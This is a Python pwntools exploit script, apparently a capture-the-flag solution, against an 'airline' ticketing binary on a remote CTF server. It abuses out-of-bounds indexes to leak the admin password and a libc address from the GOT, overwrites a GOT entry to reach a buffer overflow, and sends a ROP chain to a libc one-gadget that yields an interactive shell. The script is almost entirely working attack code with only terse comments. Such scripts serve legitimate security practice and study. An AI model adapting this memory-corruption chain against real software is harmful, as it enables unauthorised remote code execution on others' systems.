from pwn import *

elf = ELF("./airline")
p = remote("ctf.mdonhowe.com", 31111)
#p = process("./airline")
#gdb.attach(p, '''
#break *add_ticket
#break *buffer_overflow''')
#

# 1. get admin password
p.recvuntil(b'Enter option: ')
p.sendline(b'3')
p.sendline(b'1000')
p.recvuntil(b'* Passenger name: ')
password = p.recvline()[:-1] # remove newline
p.recvuntil(b'Enter option: ')

print("[*] \""+password.decode('utf8')+"\" is the admin password")
# 2. leak GOT entry
p.sendline(b'3')
p.sendline(b'-2')
p.recvuntil(b'* Passenger name: ')
getline_leak = p.recvline()[:-1] # remove newline
getline_addr_bytes = getline_leak.ljust(8, b'\x00')
getline_printable = hex(u64(getline_addr_bytes))
print("[*]", getline_printable, "is the address for getline()")

# 3. login as admin
p.sendline(b'4')
p.sendline(password)
p.recvuntil(b'Enter option: ')

# 4. perform careful GOT overwrite
p.sendline(b'6')
p.sendline(b'-2')
p.sendline(b'n')
p.sendline(b'n')
p.sendline(b'y')
p.recvuntil(b'Enter new name:')

payload = getline_addr_bytes + p64(elf.symbols['buffer_overflow'])
print("[*] sending: ", payload)
p.sendline(payload)
p.sendline(b'n')
p.sendline(b'n')
p.sendline(b'y')

libc_base = u64(getline_addr_bytes)-0x5f7a0

print("[*] libc address: " + hex(libc_base))
# 5. overflow here
#       8 bytes for random buffer, 8 bytes of base pointer, then we ROPPING to the finish line :)
p.sendline(b'5')


pop_rcx = p64(libc_base + 0x00000000000a876e)  #0x00000000000a876e : pop rcx ; ret
pop_rbx = p64(libc_base + 0x00000000000586d4)  # 0x00000000000586d4 : pop rbx ; ret 
payload = b'A'*16 + pop_rcx + p64(0) + pop_rbx + p64(0) + p64(libc_base+0x583e3) 
p.sendline(payload + b'B'*(128-len(payload))) 
p.interactive()

#r = remote('127.0.0.1', 9113)


